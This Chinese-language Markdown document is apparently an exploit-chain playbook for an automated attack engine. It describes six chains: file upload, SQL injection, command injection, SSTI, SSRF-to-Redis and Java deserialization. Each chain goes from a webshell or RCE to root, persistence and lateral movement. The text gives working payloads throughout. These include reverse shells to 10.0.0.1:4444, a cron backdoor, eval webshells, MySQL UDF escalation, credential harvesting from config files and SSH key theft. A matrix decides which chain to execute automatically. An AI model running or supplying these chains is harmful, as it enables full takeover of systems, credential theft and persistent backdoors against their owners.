# 攻击链 (Exploit Chains) — 从初始访问到完全控制

## 文件用途

attack_engine.py 在发现多个漏洞时，自动按本文档的链式路径串联攻击，将权限放到最大。

---

## Chain 1: 文件上传 → Webshell → 提权 → 持久化 → 横向移动

```
Step 1: 发现上传点
  目标: /admin/file/upload (无校验 + 返回路径)
  
Step 2: 上传 Webshell
  上传: payloads/webshells/php/filemanager.php
  路径: /uploads/abc123.php
  验证: curl https://target.com/uploads/abc123.php -d "pass=test&a=info"
  结果: ✅ PHP File Manager 已部署

Step 3: 信息收集
  whoami → www-data
  uname -a → Linux web01 5.4.0-150-generic
  ifconfig → 10.0.1.5 (内网), 对外IP
  netstat -tlnp → :80 (nginx), :3306 (mysql), :6379 (redis localhost)
  ps aux → nginx, php-fpm, mysql, redis-server

Step 4: 权限提升
  sudo -l → (root) NOPASSWD: /usr/bin/find
  利用: sudo find /etc/passwd -exec /bin/sh \;
  结果: ✅ root shell

Step 5: 持久化
  echo "ssh-rsa AAA...kali@kali" >> /root/.ssh/authorized_keys
  (crontab -l; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'") | crontab -
  部署备份webshell: /var/www/html/.cache.php, /var/www/html/css/font.php

Step 6: 横向移动
  cat /etc/hosts → 发现: 10.0.1.6 db01, 10.0.1.7 app02
  cat /root/.bash_history → ssh deploy@10.0.1.6
  ls ~/.ssh/ → id_rsa (root的SSH私钥)
  ssh -i id_rsa root@10.0.1.6 → ✅ 登录成功
  重复Step 3-5 on 10.0.1.6
```

---

## Chain 2: SQL注入 → INTO OUTFILE → Webshell → 提权

```
Step 1: 确认SQL注入
  目标: /admin/database/query?sql=SELECT @@version
  结果: 8.0.35-0ubuntu0.22.04.1

Step 2: 检查写入权限
  SELECT @@secure_file_priv → (empty) → 无限制
  SELECT @@plugin_dir → /usr/lib/mysql/plugin/
  SELECT user() → root@localhost

Step 3: 写入Webshell
  SELECT '<?php @eval($_POST["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'
  验证: curl https://target.com/shell.php -d "cmd=system('id');"
  结果: uid=33(www-data)...

Step 4: MySQL UDF 提权 (如果plugin_dir可写)
  编译: gcc -shared -o udf.so udf.c -fPIC
  写入: SELECT 0x... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so'
  创建函数: CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so'
  执行: SELECT sys_exec('chmod u+s /bin/bash')
  结果: /bin/bash -p → ✅ root

Step 5: 持久化 (同Chain 1)
```

---

## Chain 3: 命令注入 → 反弹Shell → 信息收集 → 提权 → 横向移动

```
Step 1: 确认命令注入
  目标: /admin/system/ping?host=127.0.0.1
  注入: /admin/system/ping?host=127.0.0.1;whoami
  响应: "PING 127.0.0.1...\nwww-data"

Step 2: 反弹Shell
  payload: ;bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
  URL编码: %3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.1/4444%200%3E%261%27
  Attacker: nc -lvnp 4444
  结果: ✅ 接收到反弹shell

Step 3: TTY升级
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  export TERM=xterm-256color
  Ctrl+Z → stty raw -echo; fg

Step 4: 信息收集
  同 Chain 1 Step 3

Step 5: 凭据收集
  cat /var/www/html/.env → DB_PASSWORD=SuperSecret123
  cat /var/www/html/wp-config.php → define('DB_PASSWORD', 'wp_secret_456')
  cat /etc/mysql/mysql.conf.d/mysqld.cnf → [client] password=mypass

Step 6: 提权 (同 Chain 1 Step 4)
  使用收集到的密码尝试 su root
  或使用 sudo -l 发现的路径
```

---

## Chain 4: SSTI → RCE → 反弹Shell → 提权

```
Step 1: 确认SSTI
  目标: /admin/template/edit?id=1
  表单: content={{7*7}}
  响应: 49 → ✅ SSTI确认 (Jinja2)
  
Step 2: SSTI→RCE
  Payload:
    {{cycler.__init__.__globals__.os.popen('id').read()}}
  响应: uid=33(www-data) → ✅ RCE确认

Step 3: 反弹Shell
  Payload:
    {{cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"').read()}}
  Attacker: nc -lvnp 4444
  结果: ✅ 反弹shell

Step 4: 提权 (按 Chain 1)
```

---

## Chain 5: SSRF → 内网探测 → Redis RCE → 横向移动

```
Step 1: 确认SSRF
  目标: /admin/proxy/fetch?url=http://169.254.169.254/latest/meta-data/
  响应: AWS元数据 → ✅ SSRF确认
  
Step 2: 内网探测
  url=http://10.0.1.6:6379/ → Redis响应 → 存在Redis
  url=http://10.0.1.7:9200/ → ElasticSearch响应
  url=http://10.0.1.8:8080/ → Tomcat

Step 3: Redis RCE
  SSRF打Redis:
  gopher://10.0.1.6:6379/_CONFIG SET dir /var/www/html
  gopher://10.0.1.6:6379/_CONFIG SET dbfilename shell.php
  gopher://10.0.1.6:6379/_SET payload "<?php @eval($_POST['cmd']);?>"
  gopher://10.0.1.6:6379/_SAVE
  验证: curl 10.0.1.6/shell.php → ✅

Step 4: 横向移动到Redis服务器
  通过新webshell收集凭据 → SSH到更多内网主机
```

---

## Chain 6: 反序列化 → RCE → Webshell → 提权

```
Step 1: 确认反序列化
  POST /api/import
  Content-Type: application/octet-stream
  Body: rO0ABX... (Java序列化)
  响应异常: java.lang.ClassNotFoundException → ✅ 反序列化

Step 2: 生成Payload
  ysoserial CommonsCollections6 'curl 10.0.0.1/shell.php -o /var/www/html/shell.php' > payload.ser
  base64 payload.ser → rO0ABXNyA...
  
Step 3: 发送Payload
  POST /api/import
  Body: <base64_payload>
  检查: curl https://target.com/shell.php → ✅ Webshell已部署

Step 4: 提权 (按 Chain 1)
```

---

## 攻击链自动判断矩阵

| 发现的漏洞组合 | 自动执行链 |
|---------------|-----------|
| 文件上传 + 路径泄露 | Chain 1 |
| SQL注入 + @@secure_file_priv='' | Chain 2 |
| 命令注入 | Chain 3 |
| SSTI + {{7*7}}→49 | Chain 4 |
| SSRF + 内网可达 | Chain 5 |
| 反序列化 + gadget链 | Chain 6 |
| 任意文件读取 + /etc/passwd | 收集凭据 → 尝试SSH → Chain 1 |

## 攻击链终止条件

- ✅ webshell已部署 + root已获取 + 持久化已安装 = 完全控制
- ⚠️ webshell已部署 + 权限不足 + 无可用提权向量 = 部分控制
- ❌ 无可用攻击向量 = 终止攻击链，输出已有结果
